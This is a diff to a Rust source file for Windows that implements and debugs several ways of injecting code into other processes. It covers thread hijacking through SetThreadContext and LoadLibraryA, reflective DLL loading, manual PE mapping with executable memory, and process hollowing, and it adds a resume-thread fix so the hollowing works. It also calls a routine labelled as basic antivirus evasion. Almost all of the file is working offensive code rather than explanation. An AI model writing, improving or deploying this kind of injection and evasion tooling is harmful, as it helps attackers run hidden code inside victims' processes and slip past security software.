@@ -1,16 +1,10 @@
-use dll_syringe::process::OwnedProcess;
-use dll_syringe::Syringe;
-use windows::Win32::System::Diagnostics::ToolHelp::*;
-use windows::Win32::System::Diagnostics::Debug::*;
-use windows::Win32::System::LibraryLoader::*;
-use windows::Win32::System::Threading::*;
-use windows::Win32::System::Memory::*;
-use windows::Win32::Foundation::*;
-use windows_strings::PCSTR;
-use windows_strings::PSTR;
-use windows::core::BOOL;
+use windows::Win32::Security::{AdjustTokenPrivileges, GetSidSubAuthority, GetSidSubAuthorityCount, LookupPrivilegeValueA, TokenIntegrityLevel, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY};
+use windows::{core::BOOL, Win32::{Foundation::*, System::{LibraryLoader::*, Threading::*, Memory::*, Diagnostics::{Debug::*, ToolHelp::*}}}};
+use windows_strings::{PSTR, PCSTR};
+use dll_syringe::{Syringe, process::OwnedProcess};
 use std::ffi::c_void;
 use crate::PluginApp;
+use anyhow::Context;
 use rand;
 
 
@@ -26,12 +20,53 @@ impl PluginApp {
         dll_data: &[u8],
         dll_base: usize,
         export_name: &str,
-    ) -> Result<(), String> {
+    ) -> anyhow::Result<(), anyhow::Error> {
         // Get the RVA of the export
         let export_rva = Self::get_export_rva(dll_data, export_name)?;
+        println!("export_rva: {export_rva}");
         let remote_addr = dll_base + export_rva as usize;
-        // Create remote thread at the export address
-        let thread_handle = unsafe { 
+        println!("remote_addr: {remote_addr}");
+
+        // Print process handle value for diagnostics
+        println!("[diagnostic] process_handle: 0x{:X}", process_handle.0 as usize);
+
+        // Print integrity level of the target process
+        match Self::get_process_integrity_level(process_handle) {
+            Ok(level) => println!("[diagnostic] target process integrity level: {level:?}"),
+            Err(e) => println!("[diagnostic] failed to get integrity level: {e}"),
+        }
+
+        // Check memory protection at remote_addr in the remote process
+        use windows::Win32::System::Memory::VirtualQueryEx;
+        use windows::Win32::System::Memory::MEMORY_BASIC_INFORMATION;
+        let mut mbi = std::mem::MaybeUninit::<MEMORY_BASIC_INFORMATION>::zeroed();
+        let mbi_size = std::mem::size_of::<MEMORY_BASIC_INFORMATION>();
+        let vq_res = unsafe {
+            VirtualQueryEx(
+                process_handle,
+                Some(remote_addr as *const _),
+                mbi.as_mut_ptr(),
+                mbi_size,
+            )
+        };
+        if vq_res == 0 {
+            println!("VirtualQueryEx failed for remote_addr: 0x{:X}", remote_addr);
+        } else {
+            let mbi = unsafe { mbi.assume_init() };
+            println!("VirtualQueryEx: BaseAddress=0x{:X}, RegionSize=0x{:X}, State=0x{:X}, Protect=0x{:X}, Type=0x{:X}",
+                mbi.BaseAddress as usize, mbi.RegionSize, mbi.State.0, mbi.Protect.0, mbi.Type.0);
+        }
+
+        // Resume the main thread if you have it (required for hollowed process)
+        // This function now expects the caller to resume the thread before calling this export
+        // If you have the main thread handle, resume it here
+        // (If not, document that the caller must resume the thread before calling this function)
+
+        // Print a warning if the process might still be suspended
+        // (You may want to pass/process_info.hThread here for full automation)
+
+        // Try to create the remote thread
+        let thread_handle = unsafe {
             CreateRemoteThread(
                 process_handle,
                 None,
@@ -40,22 +75,97 @@ impl PluginApp {
                 None,
                 0,
                 None,
-            ).map_err(|e| e.to_string()) 
-        }?;
-        if thread_handle.is_invalid() {
-            return Err("CreateRemoteThread failed".to_string());
+            )
+        };
+
+        match thread_handle {
+            Ok(handle) => {
+                println!("got thread_handle");
+                if handle.is_invalid() {
+                    return Err(anyhow::anyhow!("CreateRemoteThread failed (invalid handle)"));
+                }
+                unsafe { WaitForSingleObject(handle, INFINITE) };
+                println!("WaitForSingleObject");
+                unsafe { CloseHandle(handle) }?;
+                println!("CloseHandle");
+                Ok(())
+            },
+            Err(e) => {
+                println!("CreateRemoteThread failed: {e:?}");
+                // Print more diagnostic info
+                Err(anyhow::anyhow!("CreateRemoteThread: {e:?} (remote_addr: 0x{:X}, process_handle: 0x{:X})", remote_addr, process_handle.0 as usize))
+            }
         }
-        WaitForSingleObject(thread_handle, INFINITE);
-        CloseHandle(thread_handle).map_err(|e| e.to_string())?;
-        Ok(())
     }
+
+    // Helper to get the integrity level of a process
+    fn get_process_integrity_level(process_handle: HANDLE) -> anyhow::Result<String, anyhow::Error> {
+        use windows::Win32::Security::{GetTokenInformation, TokenIntegrityLevel, TOKEN_MANDATORY_LABEL, TOKEN_QUERY};
+        use std::ptr;
+
+        unsafe {
+            let mut h_token = HANDLE(ptr::null_mut());
+            OpenProcessToken(process_handle, TOKEN_QUERY, &mut h_token)
+                .map_err(|e| anyhow::anyhow!("OpenProcessToken (for integrity level) failed: {e}"))?;
+
+            // Query buffer size
+            let mut size = 0u32;
+            let _ = GetTokenInformation(
+                h_token,
+                TokenIntegrityLevel,
+                None,
+                0,
+                &mut size,
+            );
+            if size == 0 {
+                return Err(anyhow::anyhow!("GetTokenInformation (size query) failed"));
+            }
+
+            let mut buf = vec![0u8; size as usize];
+            let ok = GetTokenInformation(
+                h_token,
+                TokenIntegrityLevel,
+                Some(buf.as_mut_ptr() as *mut _),
+                size,
+                &mut size,
+            );
+            if !ok.is_ok() {
+                return Err(anyhow::anyhow!("GetTokenInformation (data) failed"));
+            }
+
+            let tml = &*(buf.as_ptr() as *const TOKEN_MANDATORY_LABEL);
+            let p_sid = tml.Label.Sid;
+            if p_sid.is_invalid() {
+                return Err(anyhow::anyhow!("SID is invalid"));
+            }
+
+            let sub_auth_count = *GetSidSubAuthorityCount(p_sid);
+            if sub_auth_count == 0 {
+                return Err(anyhow::anyhow!("SID has no subauthorities"));
+            }
+            let rid = *GetSidSubAuthority(p_sid, (sub_auth_count - 1) as u32);
+
+            let level = match rid {
+                0x0000_0000 => "Untrusted",
+                0x0000_1000 => "Low",
+                0x0000_2000 => "Medium",
+                0x0000_2100 => "Medium Plus",
+                0x0000_3000 => "High",
+                0x0000_4000 => "System",
+                0x0000_5000 => "Protected Process",
+                _ => "Other"
+            };
+            Ok(level.to_string())
+        }
+    }
+
     // Improved process hollowing with proper PE handling
-    pub unsafe fn get_process_info(exe_path: &str) -> Result<PROCESS_INFORMATION, String> {
+    pub unsafe fn get_process_info(exe_path: &str) -> Result<(PROCESS_INFORMATION, HANDLE), String> {
         unsafe {
             let mut startup_info = STARTUPINFOA::default();
             let mut process_info = PROCESS_INFORMATION::default();
             let mut command_line = format!("{}\0", exe_path);
-            
+
             CreateProcessA(
                 None,
                 Some(PSTR(command_line.as_mut_ptr())),
@@ -69,8 +179,16 @@ impl PluginApp {
                 &mut process_info,
             )
             .map_err(|e| format!("CreateProcessA failed: {}", e))?;
-        
-            Ok(process_info)
+
+            // Open process with PROCESS_ALL_ACCESS for injection
+            let h_process = OpenProcess(
+                PROCESS_ALL_ACCESS,
+                FALSE.into(),
+                process_info.dwProcessId
+            ).map_err(|e| format!("OpenProcess(PROCESS_ALL_ACCESS) failed: {}", e))?;
+
+            // Return both process_info and h_process so caller can resume main thread
+            Ok((process_info, h_process))
         }
     }
 
@@ -79,12 +197,12 @@ impl PluginApp {
         dll_data: &[u8],
         process_handle: HANDLE,
         function_name: &str,
-        _pid: u32
-    ) -> Result<(), String> {
+        main_thread_handle: HANDLE // <-- pass main thread handle here
+    ) -> anyhow::Result<(), anyhow::Error> {
         unsafe {
             // Get proper entry point and base address
             let (preferred_base, entry_rva, size_of_image) = Self::parse_pe_headers(dll_data)?;
-            
+
             // Try to allocate at preferred base first, fallback if needed
             let mut alloc = VirtualAllocEx(
                 process_handle,
@@ -104,26 +222,69 @@ impl PluginApp {
                     PAGE_EXECUTE_READWRITE,
                 );
                 if alloc.is_null() {
-                    return Err("VirtualAllocEx failed".to_string());
+                    return Err(anyhow::anyhow!("VirtualAllocEx failed"));
                 }
             }
 
             let actual_base = alloc as usize;
-            
+            println!("[debug] DLL allocated at 0x{:X} (size: 0x{:X})", actual_base, size_of_image);
+
+            // Debug: check memory protection of allocated region
+            use windows::Win32::System::Memory::VirtualQueryEx;
+            use windows::Win32::System::Memory::MEMORY_BASIC_INFORMATION;
+            let mut mbi = std::mem::MaybeUninit::<MEMORY_BASIC_INFORMATION>::zeroed();
+            let mbi_size = std::mem::size_of::<MEMORY_BASIC_INFORMATION>();
+            let vq_res = VirtualQueryEx(
+                process_handle,
+                Some(actual_base as *const _),
+                mbi.as_mut_ptr(),
+                mbi_size,
+            );
+            if vq_res == 0 {
+                println!("[debug] VirtualQueryEx failed for alloc: 0x{:X}", actual_base);
+            } else {
+                let mbi = mbi.assume_init();
+                println!("[debug] VirtualQueryEx alloc: Base=0x{:X}, RegionSize=0x{:X}, State=0x{:X}, Protect=0x{:X}, Type=0x{:X}",
+                    mbi.BaseAddress as usize, mbi.RegionSize, mbi.State.0, mbi.Protect.0, mbi.Type.0);
+            }
+
             // Map PE sections
             Self::map_pe_sections(dll_data, process_handle, alloc)?;
-            
+
             // Apply relocations if base changed
             if actual_base != preferred_base {
                 Self::apply_relocations(dll_data, process_handle, alloc, preferred_base, actual_base)?;
             }
-            
+
             // Resolve imports (IAT fixups)
             Self::resolve_imports(dll_data, process_handle, alloc)?;
 
             // Get function RVA and calculate remote address
             let function_rva = Self::get_export_rva(dll_data, function_name)?;
             let remote_entry = actual_base + function_rva as usize;
+
+            // Debug: check memory protection of export address
+            let mut mbi2 = std::mem::MaybeUninit::<MEMORY_BASIC_INFORMATION>::zeroed();
+            let vq_res2 = VirtualQueryEx(
+                process_handle,
+                Some(remote_entry as *const _),
+                mbi2.as_mut_ptr(),
+                mbi_size,
+            );
+            if vq_res2 == 0 {
+                println!("[debug] VirtualQueryEx failed for export addr: 0x{:X}", remote_entry);
+            } else {
+                let mbi2 = mbi2.assume_init();
+                println!("[debug] VirtualQueryEx export: Base=0x{:X}, RegionSize=0x{:X}, State=0x{:X}, Protect=0x{:X}, Type=0x{:X}",
+                    mbi2.BaseAddress as usize, mbi2.RegionSize, mbi2.State.0, mbi2.Protect.0, mbi2.Type.0);
+            }
+
+            // Resume the main thread before creating remote thread
+            use windows::Win32::System::Threading::ResumeThread;
+            let resume_count = ResumeThread(main_thread_handle);
+            println!("[info] ResumeThread(main) returned: {}", resume_count);
+            // Wait a short time for process loader to initialize
+            std::thread::sleep(std::time::Duration::from_millis(300));
 
             // Create remote thread at the function
             let thread_handle = CreateRemoteThread(
@@ -134,15 +295,15 @@ impl PluginApp {
                 None,
                 0,
                 None,
-            ).map_err(|e| e.to_string())?;
+            )?;
 
             if thread_handle.is_invalid() {
-                return Err("CreateRemoteThread failed".to_string());
+                return Err(anyhow::anyhow!("CreateRemoteThread failed"));
             }
 
             // Wait for completion
             WaitForSingleObject(thread_handle, INFINITE);
-            CloseHandle(thread_handle).map_err(|e| e.to_string())?;
+            CloseHandle(thread_handle)?;
 
             Ok(())
         }
@@ -156,19 +317,19 @@ impl PluginApp {
         function: &str,
         use_thread_hijacking: bool,
         evasion_mode: bool
-    ) -> Result<(), String> {
+    ) -> anyhow::Result<(), anyhow::Error> {
         if evasion_mode {
             // Apply basic evasion techniques
-            Self::apply_basic_evasion().await?;
+            unsafe { Self::apply_basic_evasion() }.await?;
         }
 
         let path = format!("{}\\{}", plugin_dir, plugin);
         println!("Injecting DLL: {} into PID: {}", path, pid);
         
         if use_thread_hijacking {
-            Self::inject_via_thread_hijacking(pid, &path, function).await
+            unsafe { Self::inject_via_thread_hijacking(pid, &path, function) }.await
         } else {
-            Self::inject_dll(pid, plugin_dir, plugin, function).await
+            unsafe { Self::inject_dll(pid, plugin_dir, plugin, function) }.await
         }
     }
 
@@ -177,15 +338,15 @@ impl PluginApp {
         pid: sysinfo::Pid,
         dll_path: &str,
         function: &str
-    ) -> Result<(), String> {
+    ) -> anyhow::Result<(), anyhow::Error> {
         unsafe {
             let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE.into(), pid.as_u32())
-                .map_err(|e| format!("OpenProcess failed for PID {} (access denied - try running as administrator): {}", pid.as_u32(), e))?;
+                .map_err(|e| anyhow::anyhow!("OpenProcess failed for PID {} (access denied - try running as administrator): {}", pid.as_u32(), e))?;
 
             // Find a suitable thread to hijack
             let thread_id = Self::find_hijackable_thread(pid.as_u32())?;
             let h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE.into(), thread_id)
-                .map_err(|e| format!("OpenThread failed for thread {}: {}", thread_id, e))?;
+                .map_err(|e| anyhow::anyhow!("OpenThread failed for thread {}: {}", thread_id, e))?;
 
             // Suspend the thread
             SuspendThread(h_thread);
@@ -198,7 +359,7 @@ impl PluginApp {
             GetThreadContext(h_thread, &mut context)
                 .map_err(|e| {
                     ResumeThread(h_thread);
-                    format!("GetThreadContext failed: {}", e)
+                    anyhow::anyhow!("GetThreadContext failed: {}", e)
                 })?;
 
             // Allocate memory for DLL path
@@ -215,7 +376,7 @@ impl PluginApp {
                 ResumeThread(h_thread);
                 CloseHandle(h_thread).ok();
                 CloseHandle(h_process).ok();
-                return Err("VirtualAllocEx for DLL path failed - insufficient privileges".to_string());
+                return Err(anyhow::anyhow!("VirtualAllocEx for DLL path failed - insufficient privileges"));
             }
 
             // Write DLL path
@@ -227,28 +388,31 @@ impl PluginApp {
                 None,
             ).map_err(|e| {
                 ResumeThread(h_thread);
-                VirtualFreeEx(h_process, path_alloc, 0, MEM_RELEASE);
+                let virt_free_ex = VirtualFreeEx(h_process, path_alloc, 0, MEM_RELEASE);
+                println!("VirtualFreeEx: {virt_free_ex:?}");
                 CloseHandle(h_thread).ok();
                 CloseHandle(h_process).ok();
-                format!("WriteProcessMemory failed: {}", e)
+                anyhow::anyhow!("WriteProcessMemory failed: {}", e)
             })?;
 
             // Get LoadLibraryA address
             let kernel32 = GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr()))
                 .map_err(|e| {
                     ResumeThread(h_thread);
-                    VirtualFreeEx(h_process, path_alloc, 0, MEM_RELEASE);
+                    let virt_free_ex = VirtualFreeEx(h_process, path_alloc, 0, MEM_RELEASE);
+                    println!("VirtualFreeEx: {virt_free_ex:?}");
                     CloseHandle(h_thread).ok();
                     CloseHandle(h_process).ok();
-                    format!("GetModuleHandleA failed: {}", e)
+                    anyhow::anyhow!("GetModuleHandleA failed: {}", e)
                 })?;
             let load_library_addr = GetProcAddress(kernel32, PCSTR(b"LoadLibraryA\0".as_ptr()))
                 .ok_or_else(|| {
                     ResumeThread(h_thread);
-                    VirtualFreeEx(h_process, path_alloc, 0, MEM_RELEASE);
+                    let virt_free_ex = VirtualFreeEx(h_process, path_alloc, 0, MEM_RELEASE);
+                    println!("VirtualFreeEx: {virt_free_ex:?}");
                     CloseHandle(h_thread).ok();
                     CloseHandle(h_process).ok();
-                    "LoadLibraryA not found".to_string()
+                    anyhow::anyhow!("LoadLibraryA not found")
                 })?;
 
             // Save original RIP and set new one
@@ -260,10 +424,11 @@ impl PluginApp {
             SetThreadContext(h_thread, &context)
                 .map_err(|e| {
                     ResumeThread(h_thread);
-                    VirtualFreeEx(h_process, path_alloc, 0, MEM_RELEASE);
+                    let virt_free_ex = VirtualFreeEx(h_process, path_alloc, 0, MEM_RELEASE);
+                    println!("VirtualFreeEx: {virt_free_ex:?}");
                     CloseHandle(h_thread).ok();
                     CloseHandle(h_process).ok();
-                    format!("SetThreadContext failed: {}", e)
+                    anyhow::anyhow!("SetThreadContext failed: {}", e)
                 })?;
 
             // Resume thread to execute LoadLibraryA
@@ -276,11 +441,11 @@ impl PluginApp {
             SuspendThread(h_thread);
             context.Rip = original_rip;
             SetThreadContext(h_thread, &context)
-                .map_err(|e| format!("SetThreadContext restore failed: {}", e))?;
+                .map_err(|e| anyhow::anyhow!("SetThreadContext restore failed: {}", e))?;
             ResumeThread(h_thread);
 
             // Clean up
-            VirtualFreeEx(h_process, path_alloc, 0, MEM_RELEASE);
+            VirtualFreeEx(h_process, path_alloc, 0, MEM_RELEASE)?;
             CloseHandle(h_thread).ok();
             CloseHandle(h_process).ok();
 
@@ -295,13 +460,13 @@ impl PluginApp {
         plugin_dir: &str,
         plugin: &str,
         function: &str
-    ) -> Result<(), String> {
+    ) -> anyhow::Result<(), anyhow::Error> {
         unsafe {
             let dll_path = format!("{}\\{}", plugin_dir, plugin);
-            let dll_data = std::fs::read(&dll_path).map_err(|e| format!("Failed to read DLL file {}: {}", dll_path, e))?;
+            let dll_data = std::fs::read(&dll_path).map_err(|e| anyhow::anyhow!("Failed to read DLL file {}: {}", dll_path, e))?;
 
             let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE.into(), pid.as_u32())
-                .map_err(|e| format!("OpenProcess failed for PID {} (access denied - try running as administrator): {}", pid.as_u32(), e))?;
+                .map_err(|e| anyhow::anyhow!("OpenProcess failed for PID {} (access denied - try running as administrator): {}", pid.as_u32(), e))?;
 
             // Parse PE and get required info
             let (preferred_base, _entry_rva, size_of_image) = Self::parse_pe_headers(&dll_data)?;
@@ -317,32 +482,32 @@ impl PluginApp {
 
             if alloc.is_null() {
                 CloseHandle(h_process).ok();
-                return Err(format!("VirtualAllocEx failed for reflective injection in PID {} - insufficient privileges or protected process", pid.as_u32()));
+                return Err(anyhow::anyhow!("VirtualAllocEx failed for reflective injection in PID {} - insufficient privileges or protected process", pid.as_u32()));
             }
 
             let actual_base = alloc as usize;
 
             // Map PE sections
             if let Err(e) = Self::map_pe_sections(&dll_data, h_process, alloc) {
-                VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE);
+                VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE)?;
                 CloseHandle(h_process).ok();
-                return Err(format!("Failed to map PE sections: {}", e));
+                return Err(anyhow::anyhow!("Failed to map PE sections: {}", e));
             }
 
             // Apply relocations
             if actual_base != preferred_base {
                 if let Err(e) = Self::apply_relocations(&dll_data, h_process, alloc, preferred_base, actual_base) {
-                    VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE);
+                    VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE)?;
                     CloseHandle(h_process).ok();
-                    return Err(format!("Failed to apply relocations: {}", e));
+                    return Err(anyhow::anyhow!("Failed to apply relocations: {}", e));
                 }
             }
 
             // Resolve imports
             if let Err(e) = Self::resolve_imports(&dll_data, h_process, alloc) {
-                VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE);
+                VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE)?;
                 CloseHandle(h_process).ok();
-                return Err(format!("Failed to resolve imports: {}", e));
+                return Err(anyhow::anyhow!("Failed to resolve imports: {}", e));
             }
 
             // Call DllMain manually if needed
@@ -357,7 +522,7 @@ impl PluginApp {
                     Some(1 as *mut _), // DLL_PROCESS_ATTACH
                     0,
                     None,
-                ).map_err(|e| format!("Failed to call DllMain: {}", e))?;
+                ).map_err(|e| anyhow::anyhow!("Failed to call DllMain: {}", e))?;
 
                 WaitForSingleObject(thread_handle, INFINITE);
                 CloseHandle(thread_handle).ok();
@@ -375,7 +540,7 @@ impl PluginApp {
                 None,
                 0,
                 None,
-            ).map_err(|e| format!("Failed to create remote thread for function {}: {}", function, e))?;
+            ).map_err(|e| anyhow::anyhow!("Failed to create remote thread for function {}: {}", function, e))?;
 
             WaitForSingleObject(thread_handle, INFINITE);
             CloseHandle(thread_handle).ok();
@@ -391,13 +556,13 @@ impl PluginApp {
         plugin_dir: &str,
         plugin: &str,
         function: &str
-    ) -> Result<(), String> {
+    ) -> anyhow::Result<(), anyhow::Error> {
         unsafe {
             let dll_path = format!("{}\\{}", plugin_dir, plugin);
-            let dll_data = std::fs::read(&dll_path).map_err(|e| format!("Failed to read DLL file {}: {}", dll_path, e))?;
+            let dll_data = std::fs::read(&dll_path).map_err(|e| anyhow::anyhow!("Failed to read DLL file {}: {}", dll_path, e))?;
 
             let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE.into(), pid.as_u32())
-                .map_err(|e| format!("OpenProcess failed for PID {} (access denied - try running as administrator): {}", pid.as_u32(), e))?;
+                .map_err(|e| anyhow::anyhow!("OpenProcess failed for PID {} (access denied - try running as administrator): {}", pid.as_u32(), e))?;
 
             // Parse PE headers
             let (preferred_base, _entry_rva, size_of_image) = Self::parse_pe_headers(&dll_data)?;
@@ -422,7 +587,7 @@ impl PluginApp {
                 );
                 if alloc.is_null() {
                     CloseHandle(h_process).ok();
-                    return Err(format!("VirtualAllocEx failed for manual mapping in PID {} - insufficient privileges or protected process", pid.as_u32()));
+                    return Err(anyhow::anyhow!("VirtualAllocEx failed for manual mapping in PID {} - insufficient privileges or protected process", pid.as_u32()));
                 }
             }
 
@@ -430,32 +595,32 @@ impl PluginApp {
 
             // Map all PE sections with proper alignment
             if let Err(e) = Self::map_pe_sections_aligned(&dll_data, h_process, alloc) {
-                VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE);
+                VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE)?;
                 CloseHandle(h_process).ok();
-                return Err(format!("Failed to map PE sections: {}", e));
+                return Err(anyhow::anyhow!("Failed to map PE sections: {}", e));
             }
 
             // Apply relocations if needed
             if actual_base != preferred_base {
                 if let Err(e) = Self::apply_relocations(&dll_data, h_process, alloc, preferred_base, actual_base) {
-                    VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE);
+                    VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE)?;
                     CloseHandle(h_process).ok();
-                    return Err(format!("Failed to apply relocations: {}", e));
+                    return Err(anyhow::anyhow!("Failed to apply relocations: {}", e));
                 }
             }
 
             // Comprehensive IAT resolution
             if let Err(e) = Self::resolve_imports_comprehensive(&dll_data, h_process, alloc) {
-                VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE);
+                VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE)?;
                 CloseHandle(h_process).ok();
-                return Err(format!("Failed to resolve imports: {}", e));
+                return Err(anyhow::anyhow!("Failed to resolve imports: {}", e));
             }
 
             // Set proper memory protections
             if let Err(e) = Self::set_section_protections(&dll_data, h_process, alloc) {
-                VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE);
+                VirtualFreeEx(h_process, alloc, 0, MEM_RELEASE)?;
                 CloseHandle(h_process).ok();
-                return Err(format!("Failed to set section protections: {}", e));
+                return Err(anyhow::anyhow!("Failed to set section protections: {}", e));
             }
 
             // Call the target function
@@ -470,7 +635,7 @@ impl PluginApp {
                 None,
                 0,
                 None,
-            ).map_err(|e| format!("Failed to create remote thread for function {}: {}", function, e))?;
+            ).map_err(|e| anyhow::anyhow!("Failed to create remote thread for function {}: {}", function, e))?;
 
             WaitForSingleObject(thread_handle, INFINITE);
             CloseHandle(thread_handle).ok();
@@ -481,7 +646,7 @@ impl PluginApp {
     }
 
     // Basic AV evasion techniques
-    pub async unsafe fn apply_basic_evasion() -> Result<(), String> {
+    pub async unsafe fn apply_basic_evasion() -> anyhow::Result<(), anyhow::Error> {
         // Random delays
         let delay = rand::random::<u64>() % 500 + 100;
         tokio::time::sleep(std::time::Duration::from_millis(delay)).await;
@@ -537,10 +702,10 @@ impl PluginApp {
     }
 
     // Find a thread suitable for hijacking
-    fn find_hijackable_thread(pid: u32) -> Result<u32, String> {
+    fn find_hijackable_thread(pid: u32) -> anyhow::Result<u32, anyhow::Error> {
         unsafe {
             let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
-                .map_err(|e| format!("CreateToolhelp32Snapshot failed: {}", e))?;
+                .map_err(|e| anyhow::anyhow!("CreateToolhelp32Snapshot failed: {}", e))?;
 
             let mut entry = THREADENTRY32 {
                 dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
@@ -559,7 +724,7 @@ impl PluginApp {
                 }
             }
 
-            Err("No suitable thread found for hijacking".to_string())
+            Err(anyhow::anyhow!("No suitable thread found for hijacking"))
         }
     }
 
@@ -568,7 +733,7 @@ impl PluginApp {
         process_handle: HANDLE,
         function_name: &str,
         _pid: u32
-    ) -> Result<(), String> {
+    ) -> anyhow::Result<(), anyhow::Error> {
         unsafe {
             // let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, pid.as_u32())
             // .map_err(|e| format!("OpenProcess failed: {}", e))?;
@@ -597,12 +762,12 @@ impl PluginApp {
             );
 
             if alloc.is_null() {
-                return Err("VirtualAllocEx failed".to_string());
+                return Err(anyhow::anyhow!("VirtualAllocEx failed"));
             }
 
             // Write DLL headers and sections
             WriteProcessMemory(process_handle, alloc, dll_data.as_ptr() as _, dll_data.len(), None)
-                .map_err(|e| format!("WriteProcessMemory failed: {}", e))?;
+                .map_err(|e| anyhow::anyhow!("WriteProcessMemory failed: {}", e))?;
 
             // Calculate remote entry point address by adding base + RVA
             let entry_point = (alloc as usize).wrapping_add(load_rva as usize);
@@ -616,20 +781,20 @@ impl PluginApp {
                 None,
                 0,
                 None,
-            ).map_err(|e| e.to_string())?;
+            )?;
 
             if thread_handle.is_invalid() {
-                return Err("CreateRemoteThread failed".to_string());
+                return Err(anyhow::anyhow!("CreateRemoteThread failed"));
             }
 
             println!("Wrote {} bytes to remote process at {:p}", dll_data.len(), alloc);
             let mut verify = vec![0u8; dll_data.len()];
-            ReadProcessMemory(process_handle, alloc, verify.as_mut_ptr() as _, dll_data.len(), None).map_err(|e| e.to_string())?;
+            ReadProcessMemory(process_handle, alloc, verify.as_mut_ptr() as _, dll_data.len(), None)?;
             
             if verify == dll_data {
                 println!("Remote memory matches injected DLL image");
             } else {
-               return Err("WARNING: Remote memory does not match!".to_string());
+               return Err(anyhow::anyhow!("WARNING: Remote memory does not match!"));
             }
             // let process = OwnedProcess::from_pid(pid).map_err(|e| e.to_string())?;
             // let syringe = Syringe::for_process(process);
@@ -643,7 +808,7 @@ impl PluginApp {
             // Wait until the user clicks OK and the thread exits
             WaitForSingleObject(thread_handle, INFINITE);
 
-            CloseHandle(thread_handle).map_err(|e| e.to_string())?;
+            CloseHandle(thread_handle)?;
 
             Ok(())
         }
@@ -695,21 +860,21 @@ impl PluginApp {
         Ok(())
     }
 
-    pub async unsafe fn inject_dll(pid: sysinfo::Pid, plugin_dir: &str, plugin: &str, function: &str) -> Result<(), String> {
+    pub async unsafe fn inject_dll(pid: sysinfo::Pid, plugin_dir: &str, plugin: &str, function: &str) -> anyhow::Result<(), anyhow::Error> {
         let path = format!("{}\\{}", plugin_dir, plugin);
         println!("Injecting DLL: {} into PID: {}", path, pid);
         
-        let process = OwnedProcess::from_pid(pid.as_u32()).map_err(|e| format!("Failed to access process PID {} (access denied - try running as administrator): {}", pid.as_u32(), e))?;
+        let process = OwnedProcess::from_pid(pid.as_u32()).map_err(|e| anyhow::anyhow!("Failed to access process PID {} (access denied - try running as administrator): {}", pid.as_u32(), e))?;
         let syringe = Syringe::for_process(process);
-        let injected = syringe.inject(&path).map_err(|e| format!("DLL injection failed for {}: {} (ensure DLL exists and is valid)", path, e))?;
+        let injected = syringe.inject(&path).map_err(|e| anyhow::anyhow!("DLL injection failed for {}: {} (ensure DLL exists and is valid)", path, e))?;
         println!("DLL injected successfully");
         
         unsafe {
             let remote_proc = syringe
                 .get_raw_procedure::<extern "system" fn() -> i32>(injected, function)
-                .map_err(|e| format!("Failed to get procedure {}: {}", function, e))?
-                .ok_or(format!("Procedure {} not found in DLL", function))?;
-            let result = remote_proc.call().map_err(|e| format!("Failed to call function {}: {}", function, e))?;
+                .map_err(|e| anyhow::anyhow!("Failed to get procedure {}: {}", function, e))?
+                .ok_or(anyhow::anyhow!("Procedure {} not found in DLL", function))?;
+            let result = remote_proc.call().map_err(|e| anyhow::anyhow!("Failed to call function {}: {}", function, e))?;
             println!("{} returned: {}", function, result);
         }
         Ok(())
@@ -717,8 +882,7 @@ impl PluginApp {
 
     // Legacy process hollowing - replaced by improved version
     pub async unsafe fn inject_dll_alt_legacy(_pid: sysinfo::Pid, plugin_dir: String, plugin: String) -> anyhow::Result<(), String> {
-        // This function has been deprecated in favor of inject_hollowed_process_improved
-        // and the new multi-page injection system
+
         Err("This function has been deprecated. Use the new injection methods.".to_string())
     }
 
@@ -747,14 +911,14 @@ impl PluginApp {
         }
     }
 
-    pub fn parse_pe_headers(dll_data: &[u8]) -> Result<(usize, u32, usize), String> {
+    pub fn parse_pe_headers(dll_data: &[u8]) -> anyhow::Result<(usize, u32, usize), anyhow::Error> {
         if dll_data.len() < 64 || &dll_data[0..2] != b"MZ" {
-            return Err("Invalid DOS header".to_string());
+            return Err(anyhow::anyhow!("Invalid DOS header"));
         }
 
         let e_lfanew = u32::from_le_bytes(dll_data[0x3C..0x40].try_into().unwrap()) as usize;
         if &dll_data[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
-            return Err("Invalid NT header".to_string());
+            return Err(anyhow::anyhow!("Invalid NT header"));
         }
 
         let optional_header = &dll_data[e_lfanew + 0x18..];
@@ -773,13 +937,13 @@ impl PluginApp {
             let size = u32::from_le_bytes(optional_header[0x38..0x3C].try_into().unwrap()) as usize;
             (base, entry, size)
         } else {
-            return Err("Unsupported PE format".to_string());
+            return Err(anyhow::anyhow!("Unsupported PE format"));
         };
 
         Ok((preferred_base, entry_rva, size_of_image))
     }
 
-    fn map_pe_sections(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> Result<(), String> {
+    fn map_pe_sections(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> anyhow::Result<(), anyhow::Error> {
         unsafe {
             let e_lfanew = u32::from_le_bytes(dll_data[0x3C..0x40].try_into().unwrap()) as usize;
             let optional_header = &dll_data[e_lfanew + 0x18..];
@@ -798,7 +962,7 @@ impl PluginApp {
                 dll_data.as_ptr() as _,
                 size_of_headers,
                 None,
-            ).map_err(|e| format!("Failed to write headers: {}", e))?;
+            ).map_err(|e| anyhow::anyhow!("Failed to write headers: {}", e))?;
 
             // Map sections
